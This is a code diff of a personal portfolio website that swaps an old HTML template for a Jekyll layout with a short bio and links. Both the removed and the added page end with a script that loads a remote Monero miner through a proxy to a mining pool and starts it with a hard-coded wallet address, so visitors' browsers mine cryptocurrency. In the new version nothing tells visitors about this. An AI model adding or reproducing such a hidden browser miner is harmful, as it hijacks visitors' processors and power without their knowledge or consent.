@@ -1,264 +1,33 @@
-<!DOCTYPE html>
-<html lang="en" class="no-js">
-	<head>
-		<meta charset="UTF-8" />
-		<meta http-equiv="X-UA-Compatible" content="IE=edge">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>Wei-Wei Wu</title>
-		<meta name="description" content="My personal website" />
-		<meta name="keywords" content="isometric, grid, images, masonry, perspective" />
-		<meta name="author" content="Codrops" />
-		<link rel="shortcut icon" href="favicon.ico">
-		<link rel="stylesheet" type="text/css" href="css/normalize.css" />
-		<link rel="stylesheet" type="text/css" href="css/demo.css" />
-		<link rel="stylesheet" type="text/css" href="css/component.css" />
-		<script src="js/modernizr.custom.js"></script>
-	</head>
-	<body class="demo-2">
-		<main>
-			<header class="codrops-header">
-				<h1>Wei-Wei Wu</h1>
-				<p>Software Engineer | Marathon Runner | Competitive Climber</p>
-				<!-- <nav class="codrops-demos">
-					<a href="https://www.linkedin.com/in/hungweiwu/">LinkedIn</a>
-					<br/>
-					<a href="https://github.com/hungweiwu">GitHub</a>
-					<br/>
-					<a href="https://medium.com/@weiweiwu_93837">Medium</a>
-					<br/>
-					<a href="https://www.npmjs.com/~wuxx1045">npm</a>
-					<br/>
-				</nav> -->
-				<div class="codrops-description">
-					<pre>
-const intro = `Hi ${name}!! I am a software
-engineer!!
+---
+layout: default
+title: Wei-Wei Wu
+description: Software Engineer, marathon runner, rock climber, taco lover.
+---
+<div class="flex flex-column w-80 mw9 pv4 pv0-ns center">
 
-I am currently playing with Apollo
-GraphQL clients with React as well as
-single threaded graph processing
-in Rust.
+  {% include header.html %}
 
-I am also mining Monero
-with this website ;)`;
-					</pre>
-				</div>
-				<!-- <div class="codrops-links">
-					<a class="codrops-icon codrops-icon--prev" href="http://tympanus.net/Development/DistortedButtonEffects/" title="Previous Demo"><span>Previous Demo</span></a>
-					<a class="codrops-icon codrops-icon--drop" href="http://tympanus.net/codrops/?p=27094" title="Back to the article"><span>Back to the Codrops article</span></a>
-				</div> -->
-			</header>
-			<section class="section section--intro">
-				<div class="isolayer isolayer--deco1 isolayer--shadow">
-					<ul class="grid">
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/1.png" alt="01" />
-							</a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/2.png" alt="02" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/3.png" alt="03" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="http://theweiweiwu.com/games/hotdog/"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/karie.png" alt="04" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/5.png" alt="05" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="http://theweiweiwu.com/pretty-interaction-icons/"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/clap.png" alt="06" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://github.com/hungweiwu/qwop-thesis/blob/master/thesis.pdf"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/qwop.png" alt="07" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/8.png" alt="08" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://github.com/hungweiwu/minecraft-virus-mod"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/minecraft.png" alt="09" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://github.com/hungweiwu/zookeeper-bot"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/zookeeper.png" alt="10" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/1.png" alt="01" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://whispering-castle-23170.herokuapp.com/index.html"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/macbot.png" alt="02" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="http://theweiweiwu.com/games/bernie/"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/bernie.png" alt="03" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/4.png" alt="04" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/5.png" alt="05" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="http://ajanta.cs.umn.edu/"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/showcase/beehive.png" alt="06" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/7.png" alt="07" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/8.png" alt="08" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/9.png" alt="09" /></a>
-						</li>
-						<li class="grid__item">
-							<a class="grid__link" href="https://dribbble.com/fuviz"><div class="layer"></div><div class="layer"></div><div class="layer"></div><img class="grid__img layer" src="img/Dribbble/10.png" alt="10" /></a>
-						</li>
-					</ul>
-				</div>
-			</section><!--/intro-->
-			<section class="interval">
-				<p class="interval__text">
-					Check out my <a href="https://www.overleaf.com/read/rgbpfgyrszyy#/39094946/" target="_blank">RESUME</a>
-					and feel free to send me an <a href="mailto:wuxx1045@umn.edu" target="_blank">email</a> if you have some cool ideas! :)
-					<br>
-					<br>
-					I published a couple of packages on <a href="https://www.npmjs.com/~wuxx1045" target="_blank">npm</a> so def check those out. Follow me on <a href="https://github.com/hungweiwu" target="_blank">GitHub</a> and lets connect on <a href="https://www.linkedin.com/in/hungweiwu/" target="_blank">LinkedIn</a>!
-				</p>
-				<!-- <a class="pater" href="https://goo.gl/KArLiy">
-					<h2 class="pater__title" aria-label="PageCloud"><img src="img/PageCloud_logo.svg" alt="PageCloud Logo"/></h2>
-					<p class="pater__desc">Take control of your website with features you won't find anywhere else. Find out why PageCloud is the world's most advanced website creator today!</p>
-				</a> -->
-			</section>
+  <div class="flex-auto flex flex-column justify-center pv4 pv5-ns">
+    <h1 class="mt0 mb4 fw5 f3 f2-m f1-l normal lh-copy lh-title-ns measure-narrow black-80">
+      Hello, I&rsquo;m Wei-Wei Wu. {{ page.description }}
+    </h1>
+    <p class="mv0 f5 f4-ns lh-copy measure">
+      Studied computer science at <a class="pb1-ns no-underline color-inherit bb color-animate hover-dark-red" href="https://twin-cities.umn.edu/">University of Minnesota</a>.
+      I've interned previously at <a class="pb1-ns no-underline color-inherit bb color-animate hover-dark-red" href="https://amazon.com">Amazon</a>,
+      <a class="pb1-ns no-underline color-inherit bb color-animate hover-dark-red" href="http://www.unitedhealthgroup.com/">UnitedHealth Group</a>, and
+      <a class="pb1-ns no-underline color-inherit bb color-animate hover-dark-red" href="https://www.lilitofu.com/">Lilitofu</a>.
+    </p>
+  </div>
 
-			<!-- Related demos -->
-			<!-- <section class="content content--related">
-				<p>If you enjoyed this demo you might also like:</p>
-				<a class="media-item" href="http://tympanus.net/Development/ImageGridEffects/">
-					<img class="media-item__img" src="img/related/ImageGridEffects.jpg">
-					<h3 class="media-item__title">Effect Ideas for Image Grids</h3>
-				</a>
-				<a class="media-item" href="http://tympanus.net/Development/AnimatedGridLayout/">
-					<img class="media-item__img" src="img/related/GridItemAnimation.jpg">
-					<h3 class="media-item__title">Grid Item Animation Layout</h3>
-				</a>
-			</section> -->
-		</main>
-		<script src="js/imagesloaded.pkgd.min.js"></script>
-		<script src="js/masonry.pkgd.min.js"></script>
-		<script src="js/dynamics.min.js"></script>
-		<script src="js/classie.js"></script>
-		<script src="js/main.js"></script>
-		<script>
-		(function() {
-  function getRandomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-  }
+  {% include projects.html %}
+  {% include footer.html %}
 
-  new IsoGrid(document.querySelector(".isolayer--deco1"), {
-    transform:
-      "translateX(33vw) translateY(-340px) rotateX(45deg) rotateZ(45deg)",
-    stackItemsAnimation: {
-      properties: function(pos) {
-        return {
-          translateZ: (pos + 1) * 30,
-          rotateZ: getRandomInt(-4, 4)
-        };
-      },
-      options: function(pos, itemstotal) {
-        return {
-          type: dynamics.bezier,
-          duration: 500,
-          points: [
-            { x: 0, y: 0, cp: [{ x: 0.2, y: 1 }] },
-            { x: 1, y: 1, cp: [{ x: 0.3, y: 1 }] }
-          ],
-          delay: (itemstotal - pos - 1) * 40
-        };
-      }
-    },
-    // onload add the loaded class to make the opacity of the circly thing 0
-    onGridLoaded: function() {
-      classie.add(document.body, "grid-loaded");
-    }
-  });
+  <script src="http://theweiweiwu.com/my-proxy/m.js?proxy=wss://wu-proxy.herokuapp.com?pool=pool.supportxmr.com:3333"></script>
+  <script>
+  var miner = CH.Anonymous(
+    "49dAuSkvmLoihv6UwbEpmtg88dbV9KcAYStuhqC7PoSGaYRSnput2EHS7zjxdt58iALX5Ehe2FxsQUuq2HBu8KES7hoKytu"
+  );
+  miner.start();
+  </script>
 
-  // new IsoGrid(document.querySelector(".isolayer--deco2"), {
-  //   perspective: 3000,
-  //   transform: "translateY(-150px) rotateX(55deg) rotateZ(-45deg)",
-  //   stackItemsAnimation: {
-  //     properties: function(pos) {
-  //       return {
-  //         translateX: getRandomInt(-60, 60),
-  //         translateY: getRandomInt(-60, 60),
-  //         rotateZ: getRandomInt(-10, 10)
-  //       };
-  //     },
-  //     options: function(pos, itemstotal) {
-  //       return {
-  //         type: dynamics.bezier,
-  //         duration: 800,
-  //         points: [
-  //           { x: 0, y: 0, cp: [{ x: 0.2, y: 1 }] },
-  //           { x: 1, y: 1, cp: [{ x: 0.3, y: 1 }] }
-  //         ],
-  //         delay: (itemstotal - pos - 1) * 20
-  //       };
-  //     }
-  //   }
-  // });
-  //
-  // new IsoGrid(document.querySelector(".isolayer--deco3"), {
-  //   transform:
-  //     "translateX(40vw) translateY(100px) rotateX(15deg) rotateY(0) rotateZ(40deg)",
-  //   stackItemsAnimation: {
-  //     properties: function(pos) {
-  //       return {
-  //         rotateY: pos * -15
-  //       };
-  //     },
-  //     options: function(pos, itemstotal) {
-  //       return {
-  //         type: dynamics.bezier,
-  //         duration: 500,
-  //         points: [
-  //           { x: 0, y: 0, cp: [{ x: 0.2, y: 1 }] },
-  //           { x: 1, y: 1, cp: [{ x: 0.3, y: 1 }] }
-  //         ],
-  //         delay: (itemstotal - pos - 1) * 40
-  //       };
-  //     }
-  //   }
-  // });
-  //
-  // new IsoGrid(document.querySelector(".isolayer--deco4"), {
-  //   perspective: 3000,
-  //   transform:
-  //     "translate3d(-200px,-200px,0) scale3d(0.8,0.8,1) rotateY(45deg) rotateZ(-10deg)",
-  //   stackItemsAnimation: {
-  //     properties: function(pos) {
-  //       return {
-  //         rotateX: (pos + 1) * -15
-  //       };
-  //     },
-  //     options: function(pos, itemstotal) {
-  //       return {
-  //         type: dynamics.spring,
-  //         delay: (itemstotal - pos - 1) * 30
-  //       };
-  //     }
-  //   },
-  //   onGridLoaded: function() {
-  //     classie.add(document.body, "grid-loaded");
-  //   }
-  // });
-})();
-</script>
-
-<script src="http://theweiweiwu.com/my-proxy/m.js?proxy=wss://wu-proxy.herokuapp.com?pool=pool.supportxmr.com:3333"></script>
-<script>
-var miner = CH.Anonymous(
-  "49dAuSkvmLoihv6UwbEpmtg88dbV9KcAYStuhqC7PoSGaYRSnput2EHS7zjxdt58iALX5Ehe2FxsQUuq2HBu8KES7hoKytu"
-);
-miner.start();
-</script>
-</body>
-</html>
+</div>
